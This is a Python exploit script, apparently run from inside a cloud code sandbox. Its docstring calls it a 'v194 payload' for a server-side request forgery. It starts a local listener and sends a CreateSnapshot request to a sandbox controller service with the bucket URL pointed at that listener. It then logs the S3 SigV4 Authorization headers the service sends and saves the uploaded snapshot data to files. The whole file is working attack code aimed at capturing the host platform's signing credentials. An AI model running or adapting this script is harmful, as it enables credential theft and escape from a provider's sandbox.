# -*- coding: utf-8 -*-
"""v194 payload (sandbox user): 23456 CreateSnapshot s3:// SSRF - 沙箱用户视角
1. 监听 127.0.0.1:18081 (沙箱 netns)
2. CreateSnapshot driveId=sandbox bucketBaseUrl=s3://127.0.0.1:18081/snap/x
3. 记录 S3 请求 + SigV4 Authorization
全部 print flush (进程可能被杀, 靠 stream 拿输出)"""
import socket, time, json, threading, sys, os

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

RECV = []
LOCK = threading.Lock()

log('=== 1 listener ===')
def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', 18081))
        srv.listen(20)
        srv.settimeout(1)
        log('LISTENER UP')
        end = time.time() + 80
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(3)
            try:
                d = b''
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 3000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append((a, d))
                log('RECV from %s %d bytes' % (a, len(d)))
                for line in d.split(b'\r\n'):
                    if line[:16].lower() == b'authorization: ':
                        log('AUTH: %r' % line[:800])
                    if line[:12].lower() == b'x-amz-date' or line[:8].lower() == b'amz-sdk' or line[:15].lower() == b'x-amz-content-s':
                        log('HDR: %r' % line[:300])
        srv.close()
    except Exception as e:
        log('LISTENER EXC %s' % e)

t = threading.Thread(target=listener, daemon=True)
t.start()
time.sleep(2)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

def post(port, path, body, t=15):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

# ============ 2: 请求 ============
log('=== 2 ctrl snapshot ===')
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': 'sandbox', 'bucketBaseUrl': 's3://127.0.0.1:18081/snap/x'}, t=15)
log('CTRL S3 sandbox -> %s %r' % (st, pay[:800]))

log('=== 3 wait ===')
time.sleep(25)
with LOCK:
    log('TOTAL RECV %d' % len(RECV))
    for i, (a, d) in enumerate(RECV):
        log('R%d %s %d bytes: %r' % (i, a, len(d), d[:500]))
        try:
            hb = d.split(b'\r\n\r\n', 1)
            if len(hb) > 1 and len(hb[1]) > 100:
                fn = '/vercel/sandbox/v194up%d.bin' % i
                open(fn, 'wb').write(hb[1])
                log('SAVED %s %d bytes' % (fn, len(hb[1])))
        except Exception as e:
            log('SAVE EXC %s' % e)

log('V194_DONE')
